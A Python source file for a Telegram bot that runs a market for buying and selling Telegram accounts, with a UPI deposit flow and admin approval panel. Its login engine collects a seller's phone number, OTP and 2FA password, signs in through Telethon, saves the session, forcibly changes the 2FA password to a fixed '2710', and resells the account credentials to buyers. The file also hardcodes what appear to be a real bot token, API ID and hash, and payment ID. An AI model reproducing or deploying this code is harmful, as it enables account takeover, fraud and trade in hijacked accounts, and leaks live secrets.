import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
from telethon.sessions import StringSession
import asyncio
import os
import threading
import re
import logging
from flask import Flask

# --- LOGGING SETUP ---
logging.basicConfig(level=logging.INFO)

# --- WEB SERVER FOR 24/7 ---
app = Flask('')
@app.route('/')
def home(): return "<h1>MASTER BOT SERVER ACTIVE 🚀</h1>"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ADVANCED DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes', 
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
    'logs': []
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- PERMISSION CHECK ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

# --- MAIN KEYBOARD ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in db['users']:
        db['users'][uid] = {'balance': 0, 'history': []}
    bot.send_message(message.chat.id, "🔥 **PRIME MASTER BOT v8.0**\n\nAll systems functional. Select an option below:", reply_markup=main_menu())

# --- ADMIN PANEL COMMANDS ---
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id): return
    panel_text = (
        "👑 **ADMIN COMMAND CENTER**\n\n"
        "🌍 `/addcountry [NAME] [BUY] [SELL]`\n"
        "➕ `/addstock` (With Login Flow)\n"
        "👤 `/addadmin [USER_ID]`\n"
        "💰 `/addbal [USER_ID] [AMT]`\n"
        "💳 `/setbal [USER_ID] [AMT]`\n"
        "📢 `/broadcast [MSG]`\n"
        "💳 `/changeupi [UPI_ID]`\n"
        "📊 `/stats`"
    )
    bot.send_message(message.chat.id, panel_text)

@bot.message_handler(commands=['addcountry'])
def add_country_logic(message):
    if not is_admin(message.from_user.id): return
    try:
        parts = message.text.split()
        name, buy, sell = parts[1].upper(), int(parts[2]), int(parts[3])
        db['buy_rates'][name] = buy
        db['sell_rates'][name] = sell
        db['stock'][name] = []
        bot.reply_to(message, f"✅ **Country Added:** {name}\n🛒 Buy: ₹{buy}\n📤 Sell: ₹{sell}")
    except: bot.reply_to(message, "❌ Format: `/addcountry INDIA 40 25` ")

# --- LOGIN ENGINE (AUTO 2FA CHANGE TO 2710) ---
def login_handler(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {
            'client': client, 'phone': phone, 'hash': req.phone_code_hash, 
            'loop': loop, 'country': country, 'mode': mode
        }
        msg = bot.send_message(chat_id, "📩 **OTP Sent!** Apna 5-digit code bhejein:")
        bot.register_next_step_handler(msg, verify_otp)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

def verify_otp(message):
    uid = message.chat.id
    d = active_logins.get(uid)
    if not d: return
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], message.text.strip(), phone_code_hash=d['hash']))
        finalize_process(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            msg = bot.send_message(uid, "🔐 **2FA Password Detected!** Enter Password:")
            bot.register_next_step_handler(msg, verify_2fa)
        else: bot.send_message(uid, "❌ Invalid OTP.")

def verify_2fa(message):
    uid = message.chat.id
    d = active_logins.get(uid)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=message.text.strip()))
        finalize_process(message, d, message.text.strip())
    except: bot.send_message(uid, "❌ Wrong 2FA Password.")

def finalize_process(message, d, pwd="None"):
    uid = message.chat.id
    if d['mode'] == "sell":
        # AUTO 2FA CHANGE TO 2710
        try:
            d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
                new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="2710")
            )))
            pass_status = "✅ 2FA changed to 2710"
        except: pass_status = "⚠️ 2FA Change Skipped"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}"),
                   types.InlineKeyboardButton("❌ REJECT", callback_data=f"sr_{uid}"))
        
        for adm in db['admins']:
            bot.send_message(adm, f"📦 **NEW SELL REQUEST**\nUser: `{uid}`\nNum: `{d['phone']}`\nNew 2FA: `2710`", reply_markup=markup)
        bot.send_message(uid, f"✅ Login Done! {pass_status}. Admin will approve soon.")
    else:
        db['stock'][d['country']].append(f"{d['phone']}:PASS:{pwd}")
        bot.send_message(uid, f"✅ ID {d['phone']} added to {d['country']} stock.")

# --- DEPOSIT SYSTEM (STRICT) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def deposit_init(m):
    msg = bot.send_message(m.chat.id, "💵 **Deposit Amount (₹):**")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(m):
    if not m.text.isdigit(): return bot.send_message(m.chat.id, "❌ Valid amount likho.")
    amt = m.text
    msg = bot.send_message(m.chat.id, f"💳 **Payable UPI:** `{db['upi']}`\n\nAb **12-digit UTR** bhejein:")
    bot.register_next_step_handler(msg, dep_ss, amt)

def dep_ss(m, amt):
    utr = m.text.strip()
    if len(utr) != 12 or not utr.isdigit():
        return bot.send_message(m.chat.id, "❌ **STRICT UTR CHECK:** Sirf 12-digit number bhejein.")
    msg = bot.send_message(m.chat.id, "📸 Payment ka **Screenshot** bhejein:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(m, amt, utr):
    if m.content_type != 'photo': return bot.send_message(m.chat.id, "❌ Screenshot missing. Try again.")
    uid = m.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"),
               types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for adm in db['admins']:
        bot.send_photo(adm, m.photo[-1].file_id, caption=f"🔔 **DEPOSIT REQ**\nUser: `{uid}`\nAmt: ₹{amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(m.chat.id, "⏳ Admin verification start ho gayi hai.")

# --- CALLBACK HANDLERS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    p = call.data.split('_')
    if p[0] == 'da': # Deposit Approve
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added to your balance!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'sa': # Sell Approve
        uid, c = int(p[1]), p[2]
        rate = db['sell_rates'].get(c, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ Sell Approved! ₹{rate} added.")
        bot.edit_message_text("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'buyid':
        c, uid = p[1], call.from_user.id
        if db['users'][uid]['balance'] < db['buy_rates'][c] or not db['stock'][c]:
            return bot.answer_callback_query(call.id, "Low Bal/Stock", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= db['buy_rates'][c]
        phone = data.split(':')[0]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📩 GET CODE", callback_data=f"gotp_{phone}"),
                   types.InlineKeyboardButton("🚪 LOGOUT", callback_data=f"lout_{phone}"))
        bot.send_message(uid, f"🛒 **SUCCESS**\nData: `{data}`", reply_markup=markup)

# --- USER OPTIONS ---
@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def bal_h(m):
    bot.send_message(m.chat.id, f"💳 **Current Balance:** ₹{db['users'].get(m.from_user.id, {}).get('balance', 0)}")

@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def buy_h(m):
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        stk = len(db['stock'].get(c, []))
        markup.add(types.InlineKeyboardButton(f"{c} | ₹{p} | Stock: {stk}", callback_data=f"buyid_{c}"))
    bot.send_message(m.chat.id, "🛒 **Market:**", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📤 SELL ID')
def sell_h(m):
    if not db['sell_rates']: return bot.send_message(m.chat.id, "❌ Market Closed.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    bot.send_message(m.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_process(m):
    c = m.text.split()[1]
    msg = bot.send_message(m.chat.id, "📞 Enter Number (+):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=login_handler, args=(m.chat.id, ms.text, c, "sell")).start())

@bot.message_handler(func=lambda m: m.text == '📞 SUPPORT')
def sup_h(m):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"))
    bot.send_message(m.chat.id, "Support link:", reply_markup=markup)

bot.polling(none_stop=True)
